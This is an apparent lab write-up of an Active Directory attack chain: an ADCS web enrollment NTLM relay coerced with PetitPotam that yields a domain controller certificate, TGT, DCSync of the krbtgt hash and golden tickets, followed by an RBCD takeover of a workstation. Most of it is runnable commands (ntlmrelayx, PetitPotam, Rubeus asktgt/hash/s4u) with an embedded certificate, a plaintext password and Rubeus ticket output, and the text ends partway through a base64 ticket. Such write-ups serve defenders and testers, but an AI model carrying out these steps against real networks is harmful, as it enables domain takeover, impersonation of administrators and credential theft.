# ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate

This is a quick lab to familiarize with an Active Directory Certificate Services \(ADCS\) + PetitPotam + NLTM Relay technique that allows attackers, given ADCS is misconfigured \(which it is by default\), to effectively escalate privileges from a low privileged domain user to Domain Admin.

## Conditions

Below are listed the conditions making an AD environment vulnerable to ADCS + NTLM relay attack:

* ADCS is configured to allow NTLM authentication;
* NTLM authentication is not protected by EPA or SMB signing;
* ADCS is running either of these services:
  * Certificate Authority Web Enrollment
  * Certificate Enrollment Web Service

## Overview

Below provides a high level overview of how the attack works:

1. Get a foothold in an AD network with a misconfigured ADCS instance;
2. Setup an NTLM relay listener on a box you control, so that incoming authentications are relayed to the misconfigured ADCS, so that a certificate of the target Domain Controller \(DC\) machine account could be obtained;
3. Force the target DC to authenticate \(using PetitPotam or PrintSpooler trick\) to the box running your NTLM relay;
4. Target DC attempts to authenticate to your NTLM relay;
5. NTLM relay receives the DC machine authentication and relays it to the ADCS;
6. ADCS provides a certificate for the target DC computer account;
7. Use the DC's computer account certificate to request its Kerberos TGT;
8. Use target DC's computer account TGT to perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash of `krbtgt`;
9. Use `krbtgt` NTLM hash to create [Golden Tickets](kerberos-golden-tickets.md) that allow you to impersonate any domain user, including Domain Admin.

## Domain Take Over

### Lab Setup

This part of the lab is setup with the following computers and servers:

* 10.0.0.5 - Kali box with NTLM relay;
* 10.0.0.6 - target Domain Controller `DC01`. This is the target DC that we will coerce to authenticate to our NTLM relay on 10.0.0.5;
* 10.0.0.10 - Certificate Authority \(`CA01`\). This is where our NTLM relay 10.0.0.5 will forward `DC01` authentication;
* 10.0.0.7 - Windows worksation \(`WS01`\). This is the initial foothold in the network and this is the machine that will force the `DC01` to authenticate to our NTLM relay on 10.0.0.5;

### Installing Tools

Let's pull the version of impacket that has ADCS attack implemented and checkout the right branch:

```text
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
```

![](../../.gitbook/assets/image%20%281027%29.png)

### Configuring Virtual Environment

Prepare a python virtual environment for impacket. Start by installing the virtual environment package:

```text
apt install python3-venv
```

![Installing python3 virtual environment](../../.gitbook/assets/image%20%281031%29.png)

Create and activate the new virtual environment called `impacket`:

```text
python3 -m venv impacket
source impacket/bin/activate
```

![Initiating and activating the impacket virtual environment](../../.gitbook/assets/image%20%281036%29.png)

Let's install all impacket dependencies:

```text
pip install .
```

![Installing impacket dependencies](../../.gitbook/assets/image%20%281030%29.png)

### Finding Certificate Authority

On `WS01`, we can use a Windows LOLBIN `certutil.exe`, to find ADCS servers in the domain:

![CA01 is a Certificate Authority](../../.gitbook/assets/image%20%281033%29.png)

### Setting up NTLM Relay

On our kali box at 10.0.0.5, let's setup our NTLM relay and specify the target as `CA01`:

```text
examples/ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs
```

![NTLM relay is ready and waiting for incoming authentications](../../.gitbook/assets/image%20%281032%29.png)

### Forcing DC01 to Authenticate to NTLM Relay

From `WS01`, let's force the `DC01` to authenticate to our NTLM relay at 10.0.0.5 by executing [`PetitPotam`](https://github.com/topotam/PetitPotam):

```text
.\PetitPotam.exe 10.0.0.5 dc01
```

![DC01 is coerced to authenticate to 10.0.0.5. DC01$ certificate is retrieved from CA01](../../.gitbook/assets/image%20%281029%29.png)

Above shows how:

* `DC01` was forced to authenticate to 10.0.0.5;
* 10.0.0.5 relayed the `DC01$` authentication to `CA01`;
* `CA01` issued a certificate for the `DC01$` computer account.

### Requesting DC01$ TGT

On `WS01`, we can now use `rubeus` to request a Kerberos TGT for the `DC01$` computer account like so:

```text
.\Rubeus.exe asktgt /outfile:kirbi /user:dc01$ /ptt /certificate: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
```

{% hint style="info" %}
Use `runas /netonly /user:fake powershell` to create a new/sacrificial logon session into which the `DC01$` TGT will be injected to prevent messing up TGTs/TGSs for your existing logon sesion.
{% endhint %}

![TGT for DC01$ retrieved and injected into the current logon session](../../.gitbook/assets/image%20%281025%29.png)

`klist` confirms we now have a TGT for `DC01$` in the current logon session:

![TGT for DC01$ in memory](../../.gitbook/assets/image%20%281026%29.png)

We're can now perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash for the user `offsense\krbtgt`:

{% page-ref page="dump-password-hashes-from-domain-controller-with-dcsync.md" %}

![DCSync pulls NTLM hash of krbtgt](../../.gitbook/assets/image%20%281035%29.png)

Having the NTLM hash for `krbtgt` allows us to create [Kerberos Golden Tickets](kerberos-golden-tickets.md).

{% page-ref page="kerberos-golden-tickets.md" %}

## Remember

It's worth remembering that in some AD environments there will be highly privileged accounts connecting to workstations to perform some administrative tasks and if you have local administrator rights on a compromised Windows box, you can perform ADCS + NTLM relay attack to request a certificate for that service account. To do so, you'd need the following:

* Stop the SMB service on the compromised box. This requires local admin privileges on the box and a reboot to stop the machine from listening on TCP 445;
* Spin up the NTLM relay on TCP 445;
* Wait for the service account to connect to your machine;
* Service account's authentication is relayed to the ADCS and spits out the servive account certificate;
* Use service account's certificate to request its Kerberos TGT;
* You've now gained administrative privileges on machines the compromised service account can access.

## Remote Computer Take Over

It's also possible to gain administrative privileges over any remote computer given we have network access to that computer, as pointed out by Lee Christensen:

{% embed url="https://twitter.com/tifkin\_/status/1418855927575302144/photo/1" %}

### Lab Setup

This part of the lab is setup with the following computers and servers:

* 10.0.0.5 - Kali box with NTLM relay;
* 10.0.0.7 - Windows worksation \(`WS01`\). This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for a remote take over;
* 10.0.0.6 - Domain Controller `DC01`;
* 10.0.0.10 - Certificate Authority \(`CA01`\). This is the box from which we will coerce `WS01` to authenticate to `DC01`;

### Setting up NTLM Relay

Let's set up our NTLM relay on the Kali box to relay authentications to DC01 via `LDAP` and specify the --delegate-access flag, which will automate the Resource Basded Constrained Delegation \(RBCD\) attack steps:

```python
examples/ntlmrelayx.py -t ldaps://dc01 -smb2support --delegate-access
```

Notes about RBCD takeover:

{% page-ref page="resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md" %}

### Forcing WS01 to Authenticate to NTLM Relay

On computer `CA01`, let's invoke PetitPotam and coerce `WS01` \(10.0.0.7\) to authenticate to our Kali box where our NTLM relay is setup:

```text
.\PetitPotam.exe kali@80/spotless.txt 10.0.0.7
```

![](../../.gitbook/assets/image%20%281043%29.png)

On our Kali box, we can see the the incoming authentication from WS01$ was relayed to ldaps://dc01 and that a new computer `quaiivve$` account \(that `WS01` now trusts and allows to impersonate any domain user\):

![LDAP relay succeeds, delegation rights setup](../../.gitbook/assets/image%20%281048%29.png)

Below is just a quick screenshot showing that the `QUAIIVEE` computer account has been indeed created and `WS01$` has some privileges:

![Computer AD object created as part of RBCD attack](../../.gitbook/assets/image%20%281042%29.png)

### Calculating Hash

On computer `CA01`, let's calculate the RC4 hash for the newly created computer account `QUAIIVVE$`:

```text
.\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:'K_-Jzsb&uK!`TIH'
```

![Rubeus calculates the RC4 hash - 3F55290748348504327CDA267FCCA190](../../.gitbook/assets/image%20%281041%29.png)

### Impersonating Domain Admin on WS01

While on `CA01`, we can use the rubeus `s4u` command, which stands for S4U2proxy, which is a Kerberos extension that enables services to request TGS tickets to other services on behalf of a given user. In this instance, we're requesting a TGS for `cifs/ws01.offense.local`, which grants access to `WS01` computer's file system, i.e., access to the `c$` share\) on behalf of the Domain Admin `administrator@offense.local`:

```text
PS C:\tools> .\Rubeus.exe s4u /user:QUAIIVVE$ /rc4:3F55290748348504327CDA267FCCA190 /impersonateuser:administrator@offense.local /msdsspn:cifs/ws01.offense.local /ptt /domain:offense.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: S4U

[*] Using rc4_hmac hash: 3F55290748348504327CDA267FCCA190
[*] Building AS-REQ (w/ preauth) for: 'offense.local\QUAIIVVE$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFAjCCBP6gAwIBBaEDAgEWooIEEzCCBA9hggQLMIIEB6ADAgEFoQ8bDU9GRkVOU0UuTE9DQUyiIjAg
      oAMCAQKhGTAXGwZrcmJ0Z3QbDW9mZmVuc2UubG9jYWyjggPJMIIDxaADAgESoQMCAQKiggO3BIIDs4cS
      mkUPxpLm/0VamMXun7JiMnv9KdcA6NEDqqRxGkaCnqAOUJuORZr8IMBRZIAQQ/0uMPqZFka4H/3hmGDu
      j/nkZbIAAfKUnuXDEynJYR+Ra8u23pmYd2uTEtKFbNkiorpmoQVpEvgrpIWcE2qRsL2Gf4dVuV2NCxqV
      b2aBjmWqWN/nBnaUCjp8B2aGa9FjxdP6s+SgPQiXCoC+80iOLu38Pssb4Cf+RJBNNszdYnPlp3SK9Lyd
      7tDCsaF3aJO9H6+BYlI43MvQxyu40sW44skSB0sXrru3uFZpW6hdftAnUij3OArEVPjp52LN/VdLoUHq
      VX/HFeiPlX0Fly0kJ+wAeeLu60r70V6poWQ9PgTjYB1Ak1NGXKIZApUPwiTkraJBQ4rotAnwN+oMu7qS
      un9A4ARq2xeQDa9CqxXAfdtaBVYrYCwJSZfnzA6hlRVOw5tp7gA9bqvm7fj+gvUgFQhd/1FmTra5JIVp
      LKmL7Uzj2WKZqPnHygGZ+v+2QMm1vDJXqhbhgL2Civy5Um3tH+F5UVyo24gzxx470EUniLKTJ8EKNHFy
      idy+KVPJa7FAzzkgQgRDGgxmsYgPeSThKu3fkAijw4mz89aEek93F1/Hc/iMnwpC/7pSg07qy2uY9kz0
      8yKxOtYC+GBLuCsXsijRIHNbqVdwIGkalVuejvY+iDoC4vGwOiPhYmI1WrC4qUT6c1/hnKBMF+FHmRyS
      Njp0lCI0/71gy34xeb0J47hW07AtjiPPO43dU23G8rgWaSkjjws5SerEacHo4onilr47AqA53QRT3JDN
      vo1Hy5oWKM1Tm3LfEIjQMv32AkqDqB+zjRM5de+PXpqfUtwSifAq3N4YcfqWHrbNFrU5oz5Cdz3GvxeL
      uwgNxbVXXNbfFi1dHQ5XIwNeTyFpdHUglwmOyooqxcMrMiiNTUivRzheeEw+5SJvyHMsmVeQk0MeOUO1
      n8Gx8mw18uLU/EvVnmwfOFHLM1d4wpUHuOVOC0TwHM3npuPXR6UzZcvKYHlIeFdeduF8Rt/rNq+vLdKu
      5I6EEzc0ZCeuXcXu4FKHd/BDILwhwSK9is2emWmqUMNT+NnbZmHmXugM6I1t2+nIiVmB4DgOarumoomj
      PqnkSYnXVxWyF+0bNqCokUKE4RS4igUsWlF8WRhJqZITGVLIqH+YRVuG6N4LqceJm2MAtpPPPRSxJ3SS
      v3JP3LS9jvjHKyJZQokp46ZGn87M69o3QvrPPn0A0JZggKO4qTxSoHuhXQBqo4HaMIHXoAMCAQCigc8E
      gcx9gckwgcaggcMwgcAwgb2gGzAZoAMCARehEgQQNUQwX1lLwtWzFUCVxDsvo6EPGw1PRkZFTlNFLkxP
      Q0FMohYwFKADAgEBoQ0wCxsJUVVBSUlWVkUkowcDBQBA4QAApREYDzIwMjEwNzMxMjAwNzE5WqYRGA8y
      MDIxMDgwMTA2MDcxOVqnERgPMjAyMTA4MDcyMDA3MTlaqA8bDU9GRkVOU0UuTE9DQUypIjAgoAMCAQKh
      GTAXGwZrcmJ0Z3QbDW9mZmVuc2UubG9jYWw=


[*] Action: S4U

[*] Using domain controller: dc01.offense.local (10.0.0.6)
[*] Building S4U2self request for: 'QUAIIVVE$@OFFENSE.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator@offense.local' to 'QUAIIVVE$@OFFENSE.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'administrator@offense.local' to target SPN 'cifs/ws01.offense.local'
[*] Using domain controller: dc01.offense.local (10.0.0.6)
[*] Building S4U2proxy request for service: 'cifs/ws01.offense.local'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/ws01.offense.local':

      doIGXDCCBligAwIBBaEDAgEWooIFWDCCBVRhggVQMIIFTKADAgEFoQ8bDU9GRkVOU0UuTE9DQUyiJTAj
      oAMCAQKhHDAaGwRjaWZzGxJ3czAxLm9mZmVuc2UubG9jYWyjggULMIIFB6ADAgESoQMCAQOiggT5BIIE
      9VCdZpnpXRodSwFgssc1BTs+UtIhkOGTG15XIragjr2cWAzWkqS3COJapihfdZ6PWrloviqo20o0cJdN
      fBGxl424ju1seWVZLvZiIZWilzci6m0fYZzwiaG+MwnBq2xu/Yrr8XGvkImJm14gzNpm8KOhHLNWh+nL
      GE6+CN9Wc6FMEEAUXKK+Q5k8r4qLT6Z7JOn+kUIfumea856znYAi6nUQvlbD9d01DS2QyGGlNyMMexBl
      /QWYP32cO3n0T9X6vgT8ADNmYXCg+DlrNCTFULPcVZ6nrRydDxsuEYhblKba8Zjty4PjAV5n5isdgkTE
      EmNjDO68f4savc7TrdguGqdfLP+eX3UkC2tvowioNhV07oq7Z1tQiHiHBVX394ZzVhJzjFohklxO2mXK
      RhuiJaHCFqZQcwBTK7Z6w1c/we+FAXjxiVUrCiM9+uoFPEixXIpXIFibFnK9Qu+fp3oTo6Xl7o+168XU
      116NKHB0Rm4T9sLhrGxHkkZjTcRhcZSzKbxLiH8u+nbNk1toTK6m67cb4S5WkAqrgdqPGO1fdaTxYQFj
      b2AGhAl7HRvWTexxP2yIF6gqJ5UHPq/XyaRB79Jguc4sE4E0spAyA8NuHujCFxX0yBRcna0LrGx09Smz
      qHcfHbW/ARxSoONycTcHaJ+KeOFcxOPgMPqoUiqPB9fWcRLsuBExcG9g5DU1cayZk6+rB5Q3WmQ3/cRM
      2gTdD2vO9/dKqccVKNn3WyTIVs37+3+0NnU8JmdH657VAVhzFFb2UWfA+YaZv6R9uuNyfKWtGGd6AAjG
      YLsEXJ7ZSCY6OOsb2R6r886a+/ug+2aLZhwdecH/KLAIO04bs3/CI0E+1sV0XtAPL/hR4qk1lg/WRVSc
      /DSTPG4Bdz6qZ7ugd1KcROerJh2BZfo2nJhtfMeDQOGCefbP57ZhZv1oxmLYm6cRIPB3nz3zxG9Yk8rz
      fbi4kw5xZ4uo4W5XwSDAcwvdRSE7Qat0Ey5ScazxuEVtkriDtMjQIiD3wNy/Df4cT2/PwwLj+A4O50oj
      5V+H+CJysgcD7XEeBZ3Dp4B9abzS5uYmO8x4a4fhoL4+rW5UBDAJSDuYPMl+W+CQfgo2HYKtS7HSSW54
      BPqreQykU0vJksgkSAdErfxvIDMrzKaDLa+ejkDNbX6gxx/TV/f7HuWiHV11ixcDQwJ53KAbwBUQLZOl
